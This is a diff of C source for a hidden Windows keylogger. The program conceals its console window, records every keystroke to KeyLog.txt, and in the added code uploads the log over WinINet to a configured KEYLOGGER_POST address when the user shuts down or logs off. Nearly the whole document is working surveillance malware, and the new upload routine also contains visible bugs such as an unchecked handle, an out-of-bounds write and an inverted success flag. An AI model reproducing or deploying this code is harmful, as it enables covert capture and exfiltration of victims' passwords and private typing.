@@ -1,12 +1,18 @@
+#include <config.h>
+
 #include <windows.h>
+#include <wininet.h>
 #include <shlwapi.h>
 
 #include <stdio.h>
 #include <stdbool.h>
 
-void KeyboardProcess(const char* filepath)
+static char outputFilePath[MAX_PATH];
+static bool isRunning = true;
+
+void KeyboardProcess()
 {
-    FILE* file = fopen(filepath, "a");
+    FILE* file = fopen(outputFilePath, "a");
 
     for (short keyCode = 0x08; keyCode <= 0xDE; keyCode++)
     {
@@ -16,37 +22,37 @@ void KeyboardProcess(const char* filepath)
                 GetAsyncKeyState(VK_RSHIFT))
                 switch (keyCode) 
                 {
-		    		case '1':  fputc('!', file);  break;
-		    		case '2':  fputc('@', file);  break;
-		    		case '3':  fputc('#', file);  break;
-		    		case '4':  fputc('$', file);  break;
-		    		case '5':  fputc('%', file);  break;
-		    		case '6':  fputc('^', file);  break;
-		    		case '7':  fputc('&', file);  break;
-		    		case '8':  fputc('*', file);  break;
-		    		case '9':  fputc('(', file);  break;
-		    		case '0':  fputc(')', file);  break;
-    
-		    		case 0xBA: fputc(':', file);  break;
-		    		case 0xBB: fputc('+', file);  break;
-		    		case 0xBC: fputc('<', file);  break;
-		    		case 0xBD: fputc('_', file);  break;
-		    		case 0xBE: fputc('>', file);  break;
-		    		case 0xBF: fputc('?', file);  break;
-		    		case 0xC0: fputc('~', file);  break;
-		    		case 0xDB: fputc('{', file);  break;
-		    		case 0xDC: fputc('|', file);  break;
-		    		case 0xDD: fputc('}', file);  break;
-		    		case 0xDE: fputc('\"', file); break;
-    
-                    default:
-                    {
-                        if (keyCode >= 0x41 && keyCode <= 0x5A)
-                            fputc(toupper(keyCode), file);
-                        else
-                            fputs("<SHIFT>", file);
-                    } break;
-		    	}
+                case '1':  fputc('!', file);  break;
+                case '2':  fputc('@', file);  break;
+                case '3':  fputc('#', file);  break;
+                case '4':  fputc('$', file);  break;
+                case '5':  fputc('%', file);  break;
+                case '6':  fputc('^', file);  break;
+                case '7':  fputc('&', file);  break;
+                case '8':  fputc('*', file);  break;
+                case '9':  fputc('(', file);  break;
+                case '0':  fputc(')', file);  break;
+
+                case 0xBA: fputc(':',  file);  break;
+                case 0xBB: fputc('+',  file);  break;
+                case 0xBC: fputc('<',  file);  break;
+                case 0xBD: fputc('_',  file);  break;
+                case 0xBE: fputc('>',  file);  break;
+                case 0xBF: fputc('?',  file);  break;
+                case 0xC0: fputc('~',  file);  break;
+                case 0xDB: fputc('{',  file);  break;
+                case 0xDC: fputc('|',  file);  break;
+                case 0xDD: fputc('}',  file);  break;
+                case 0xDE: fputc('\"', file); break;
+
+                default:
+                {
+                    if (keyCode >= 0x41 && keyCode <= 0x5A)
+                        fputc(toupper(keyCode), file);
+                    else
+                        fputs("<SHIFT>", file);
+                } break;
+            }
             else
                 switch (keyCode)
                 {
@@ -106,6 +112,71 @@ void KeyboardProcess(const char* filepath)
     fclose(file);
 }
 
+static bool SendHTTPData()
+{
+    HINTERNET internetHandler = InternetOpen("HTTP", INTERNET_OPEN_TYPE_DIRECT,
+                                             NULL, NULL, 0);
+    if (!internetHandler)
+        return false;
+
+    HINTERNET connectHandler = InternetOpenUrl(internetHandler, KEYLOGGER_POST,
+                                               NULL,  0, INTERNET_FLAG_RELOAD, 0);
+    if (!internetHandler)
+    {
+        InternetCloseHandle(internetHandler);
+        return false;
+    }
+   
+    FILE* file = fopen(outputFilePath, "rb");
+    if (!file)
+    {
+        InternetCloseHandle(connectHandler);
+        InternetCloseHandle(internetHandler);
+        return false;
+    }
+
+    fseek(file, 0, SEEK_END);
+    size_t bufferSize = ftell(file);
+    rewind(file);
+
+    char* buffer = (char*) malloc(bufferSize);
+    fread(buffer, 1, bufferSize, file);
+    buffer[bufferSize] = 0;
+
+    DWORD bytesWritten = 0;
+    bool success = !InternetWriteFile(connectHandler, buffer, bufferSize, &bytesWritten) 
+                    || bytesWritten != bufferSize;
+
+    InternetCloseHandle(connectHandler);
+    InternetCloseHandle(internetHandler);
+    fclose(file);
+    free(file);
+
+    return success;
+}
+
+static void InitializeFile()
+{
+    GetModuleFileName(GetModuleHandle(NULL), outputFilePath, sizeof(outputFilePath));
+    PathRemoveFileSpec(outputFilePath);
+    strcat(outputFilePath, "\\KeyLog.txt");
+}
+
+static DWORD WINAPI HandlerRoutine(DWORD controlType)
+{
+    switch (controlType)
+    {
+        case CTRL_SHUTDOWN_EVENT:
+        case CTRL_LOGOFF_EVENT:
+        {
+            return SendHTTPData();
+        } break;
+
+        default: 
+            return false;
+    }
+}
+
 int WINAPI WinMain(HINSTANCE instanceHandle, HINSTANCE previousInstanceHandle, LPSTR argv, int argc)
 {
     (void) previousInstanceHandle;
@@ -116,12 +187,12 @@ int WINAPI WinMain(HINSTANCE instanceHandle, HINSTANCE previousInstanceHandle, L
     AllocConsole();
     HWND stealth = FindWindowA("ConsoleWindowClass", NULL);
     ShowWindow(stealth, 0);
+    
+    InitializeFile();
+    SetConsoleCtrlHandler((PHANDLER_ROUTINE)HandlerRoutine, true);
 
-    char processPath[MAX_PATH]; 
-    GetModuleFileName(GetModuleHandle(NULL), processPath, (sizeof(processPath)));
-    PathRemoveFileSpec(processPath);
-    strcat(processPath, "\\KeyLog.txt");
+    while (isRunning)
+        KeyboardProcess();
 
-    while (true)
-        KeyboardProcess(processPath);
+    return 0;
 }
